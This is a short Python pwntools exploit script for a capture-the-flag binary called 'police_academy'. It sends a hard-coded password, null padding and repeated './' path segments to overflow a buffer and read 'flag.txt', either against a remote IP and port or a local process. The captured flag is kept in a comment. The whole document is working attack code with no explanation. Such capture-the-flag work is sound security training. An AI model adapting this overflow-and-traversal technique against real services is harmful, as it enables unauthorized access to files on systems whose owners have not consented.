from pwn import *
import time
import sys


def exploit():
    raw_input('wait')
    buf = 'kaiokenx20'
    buf += (16 - len(buf)) * '\x00'
    buf += ((36 - 8) / 2) * './' + 'flag.txt'
    buf += '\x00'
    proc.sendline(buf)
    proc.sendline('9')


if __name__ == '__main__':
    context.arch = 'amd64'
    connect = 'nc 128.199.224.175 13000'
    connect = connect.split(' ')
    if len(sys.argv) > 1:
        proc = remote(connect[1], int(connect[2]))
    else:
        proc = process(['./police_academy'], env={'LD_LIBRARY_PATH': './'})
    exploit()
    proc.interactive()

# pctf{bUff3r-0v3Rfl0wS`4r3.alw4ys-4_cl4SsiC}
